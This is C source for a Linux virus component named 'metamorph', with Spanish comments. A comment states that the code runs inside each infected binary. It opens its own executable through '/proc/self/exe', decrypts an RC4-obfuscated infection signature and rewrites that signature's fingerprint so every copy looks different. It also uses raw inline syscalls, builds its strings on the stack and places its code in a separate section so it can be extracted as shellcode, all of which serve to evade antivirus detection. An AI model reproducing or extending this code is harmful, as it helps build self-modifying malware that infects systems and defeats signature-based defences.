// src/metamorph.c - COMPLETO

#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <time.h>

#define SIGNATURE_MAGIC "\x99\xa4\x9c\x24\xb2"  // Tu pattern existente

// ==================== SYSCALLS INLINE ====================

static inline long sys_open(const char *path, int flags, int mode) {
    long ret;
    __asm__ volatile(
        "mov $2, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path), "S"(flags), "d"(mode)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_close(int fd) {
    long ret;
    __asm__ volatile(
        "mov $3, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_fstat(int fd, struct stat *st) {
    long ret;
    __asm__ volatile(
        "mov $5, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(fd), "S"(st)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline void *sys_mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset) {
    void *ret;
    register long r10 __asm__("r10") = flags;
    register long r8 __asm__("r8") = fd;
    register long r9 __asm__("r9") = offset;
    
    __asm__ volatile(
        "mov $9, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(len), "d"(prot), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_munmap(void *addr, size_t len) {
    long ret;
    __asm__ volatile(
        "mov $11, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(len)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_msync(void *addr, size_t len, int flags) {
    long ret;
    __asm__ volatile(
        "mov $26, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(addr), "S"(len), "d"(flags)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline ssize_t sys_readlink(const char *path, char *buf, size_t bufsiz) {
    ssize_t ret;
    __asm__ volatile(
        "mov $89, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path), "S"(buf), "d"(bufsiz)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_chmod(const char *path, mode_t mode) {
    long ret;
    __asm__ volatile(
        "mov $90, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(path), "S"(mode)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline long sys_clock_gettime(clockid_t clk_id, struct timespec *tp) {
    long ret;
    __asm__ volatile(
        "mov $228, %%rax\n"
        "syscall"
        : "=a"(ret)
        : "D"(clk_id), "S"(tp)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static inline pid_t sys_getpid(void) {
    pid_t ret;
    __asm__ volatile(
        "mov $39, %%rax\n"
        "syscall"
        : "=a"(ret)
        :
        : "rcx", "r11", "memory"
    );
    return ret;
}

// ==================== UTILIDADES (todas en .metamorph) ====================

__attribute__((section(".metamorph"), noinline))
static void *_memcpy(void *dest, const void *src, size_t n) {
    unsigned char *d = dest;
    const unsigned char *s = src;
    while (n--) *d++ = *s++;
    return dest;
}

__attribute__((section(".metamorph"), noinline))
static void *_memmem(const void *haystack, size_t hlen, const void *needle, size_t nlen) {
    if (nlen == 0) return (void *)haystack;
    if (hlen < nlen) return 0;
    
    const unsigned char *h = haystack;
    const unsigned char *n = needle;
    
    for (size_t i = 0; i <= hlen - nlen; i++) {
        size_t j;
        for (j = 0; j < nlen; j++) {
            if (h[i + j] != n[j])
                break;
        }
        if (j == nlen)
            return (void *)(h + i);
    }
    return 0;
}

// RC4 (en .metamorph)
__attribute__((section(".metamorph"), noinline))
static void _rc4_crypt(unsigned char *data, size_t len, const unsigned char *key, size_t key_len) {
    unsigned char S[256];
    unsigned char K[256];
    
    // KSA
    for (int i = 0; i < 256; i++) {
        S[i] = i;
        K[i] = key[i % key_len];
    }
    
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
    }
    
    // PRGA
    int i = 0;
    j = 0;
    for (size_t k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i];
        S[i] = S[j];
        S[j] = tmp;
        unsigned char keystream = S[(S[i] + S[j]) % 256];
        data[k] ^= keystream;
    }
}

__attribute__((section(".metamorph"), noinline))
static void _itohex(unsigned long val, char *buf, int len) {
    // hex digits construidos en stack
    char hex[17];
    hex[0]='0'; hex[1]='1'; hex[2]='2'; hex[3]='3';
    hex[4]='4'; hex[5]='5'; hex[6]='6'; hex[7]='7';
    hex[8]='8'; hex[9]='9'; hex[10]='a'; hex[11]='b';
    hex[12]='c'; hex[13]='d'; hex[14]='e'; hex[15]='f';
    hex[16]='\0';
    for (int i = len - 1; i >= 0; i--) {
        buf[i] = hex[val & 0xF];
        val >>= 4;
    }
}

// ==================== FUNCIÓN PRINCIPAL ====================

/*
 * Esta función se ejecuta DENTRO de cada binario infectado.
 * Busca su propia signature cifrada y la modifica antes de infectar.
 * 
 * IMPORTANTE: Todas las strings deben estar inline en el stack,
 * no como string literals, porque esto se extrae como shellcode puro.
 */
__attribute__((section(".metamorph")))
void metamorph_mutate_self(void) {
    char exe_path[4096];
    struct stat st;
    struct timespec ts;
    
    // 1. Construir "/proc/self/exe" en el stack (no usar string literals)
    char proc_self[16];
    proc_self[0] = '/';
    proc_self[1] = 'p';
    proc_self[2] = 'r';
    proc_self[3] = 'o';
    proc_self[4] = 'c';
    proc_self[5] = '/';
    proc_self[6] = 's';
    proc_self[7] = 'e';
    proc_self[8] = 'l';
    proc_self[9] = 'f';
    proc_self[10] = '/';
    proc_self[11] = 'e';
    proc_self[12] = 'x';
    proc_self[13] = 'e';
    proc_self[14] = '\0';
    
    // 2. Obtener path del ejecutable actual
    ssize_t path_len = sys_readlink(proc_self, exe_path, sizeof(exe_path) - 1);
    if (path_len < 0)
        return;
    exe_path[path_len] = '\0';
    
    // 3. Abrir con permisos de escritura
    int fd = sys_open(exe_path, 2, 0); // O_RDWR = 2
    if (fd < 0) {
        sys_chmod(exe_path, 0755);
        fd = sys_open(exe_path, 2, 0);
        if (fd < 0)
            return;
    }
    
    // 4. Obtener tamaño
    if (sys_fstat(fd, &st) < 0) {
        sys_close(fd);
        return;
    }
    
    // 5. Mapear en memoria
    void *map = sys_mmap(NULL, st.st_size,
                         3,  // PROT_READ | PROT_WRITE
                         1,  // MAP_SHARED
                         fd, 0);
    
    if (map == (void*)-1 || map == 0) {
        sys_close(fd);
        return;
    }
    
    // 6. Buscar signature usando el pattern (magic bytes en stack)
    unsigned char magic[5];
    magic[0] = 0x99;
    magic[1] = 0xa4;
    magic[2] = 0x9c;
    magic[3] = 0x24;
    magic[4] = 0xb2;
    
    void *sig_ptr = _memmem(map, st.st_size, magic, 5);
    
    if (!sig_ptr) {
        sys_munmap(map, st.st_size);
        sys_close(fd);
        return;
    }
    
    // 7. La signature está cifrada con RC4
    // Clave RC4 construida en stack
    unsigned char rc4_key[9];
    unsigned char OBFUSCATED_KEY[9];
    OBFUSCATED_KEY[0] = 0x76;
    OBFUSCATED_KEY[1] = 0x70;
    OBFUSCATED_KEY[2] = 0x66;
    OBFUSCATED_KEY[3] = 0x66;
    OBFUSCATED_KEY[4] = 0x35;
    OBFUSCATED_KEY[5] = 0x23;
    OBFUSCATED_KEY[6] = 0x30;
    OBFUSCATED_KEY[7] = 0x66;
    OBFUSCATED_KEY[8] = 0x66;
    
    for (int i = 0; i < 9; i++) {
        rc4_key[i] = OBFUSCATED_KEY[i] ^ 0x42;
    }
    
    // Buffer para trabajar con la signature
    unsigned char sig_buffer[128];
    _memcpy(sig_buffer, sig_ptr, 73);
    
    // Descifrar
    _rc4_crypt(sig_buffer, 73, rc4_key, 9);
    
    // 8. Buscar el fingerprint [XXXXXXXX]
    char *fp_start = 0;
    for (int i = 0; i < 73 - 9; i++) {
        if (sig_buffer[i] == '[' && sig_buffer[i + 9] == ']') {
            fp_start = (char*)&sig_buffer[i + 1];
            break;
        }
    }
    
    if (!fp_start) {
        sys_munmap(map, st.st_size);
        sys_close(fd);
        return;
    }

    // 9. Generar nuevo fingerprint
    sys_clock_gettime(0, &ts); // CLOCK_REALTIME = 0
    pid_t pid = sys_getpid();

    unsigned long seed = ts.tv_nsec ^ ((unsigned long)pid << 16) ^ ts.tv_sec;
    seed = (seed << 13) | (seed >> 19);
    seed ^= 0xDEADBEEF;
    
    // 10. Convertir a hex (8 caracteres)
    char new_fp[8];
    _itohex(seed, new_fp, 8);
    
    // 11. Reemplazar fingerprint en la signature descifrada
    _memcpy(fp_start, new_fp, 8);
    
    // 12. Volver a cifrar
    _rc4_crypt(sig_buffer, 73, rc4_key, 9);
    
    // 13. Escribir de vuelta al archivo
    _memcpy(sig_ptr, sig_buffer, 73);
    
    // 14. Sincronizar
    sys_msync(map, st.st_size, 4); // MS_SYNC = 4
    
    // 15. Cleanup
    sys_munmap(map, st.st_size);
    sys_close(fd);
}